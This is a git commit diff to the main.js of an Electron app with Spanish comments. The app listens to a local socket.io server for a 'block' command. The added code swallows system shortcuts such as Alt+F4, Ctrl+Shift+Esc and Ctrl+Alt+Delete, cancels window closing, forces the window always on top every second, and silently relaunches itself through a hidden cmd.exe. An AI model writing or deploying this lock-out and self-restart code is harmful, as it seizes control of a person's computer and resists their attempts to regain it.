f4da1faeb6814cfdd5e2367fcc08784bf8242936
𝑫𝚯𝚭𝚭𝚬𝑅來𝚳𝚾 <101079820+DozerMx@users.noreply.github.com>
2025-01-14 05:55:33 -0500

    Update main.js

--- main.js
+++ main.js
@@ -1,6 +1,7 @@
-const { app, BrowserWindow, screen, globalShortcut, ipcMain } = require('electron');
+const { app, BrowserWindow, screen, globalShortcut } = require('electron');
 const { io } = require('socket.io-client');
 const path = require('path');
+const { exec } = require('child_process');
 
 let mainWindow;
 const socket = io('http://192.168.1.88:3000');
@@ -23,13 +24,35 @@ function createWindow() {
   mainWindow.loadFile('index.html');
   mainWindow.setClosable(false);
   
-  globalShortcut.register('Alt+Tab', () => {});
-  globalShortcut.register('Alt+F4', () => {});
-  globalShortcut.register('CommandOrControl+W', () => {});
-  globalShortcut.register('CommandOrControl+R', () => {});
+  // Bloquear más combinaciones de teclas
+  globalShortcut.registerAll(['Alt+Tab', 'Alt+F4', 'CommandOrControl+W', 'CommandOrControl+R', 
+    'CommandOrControl+Shift+I', 'F11', 'Alt+Space', 'CommandOrControl+Tab', 'Alt+Esc', 
+    'CommandOrControl+Shift+Esc', 'CommandOrControl+Alt+Delete'], () => {
+    return false;
+  });
+
+  // Prevenir el cierre de la ventana
+  mainWindow.on('close', (e) => {
+    e.preventDefault();
+  });
 }
 
-app.whenReady().then(createWindow);
+// Auto-reinicio si el proceso termina
+app.on('window-all-closed', () => {
+  exec('start cmd.exe /c "node start.js"', { windowsHide: true });
+});
+
+app.whenReady().then(() => {
+  createWindow();
+  
+  // Mantener la ventana siempre visible
+  setInterval(() => {
+    if (mainWindow && !mainWindow.isVisible()) {
+      mainWindow.show();
+      mainWindow.setAlwaysOnTop(true, 'screen-saver');
+    }
+  }, 1000);
+});
 
 socket.on('block', () => {
   if (mainWindow) {
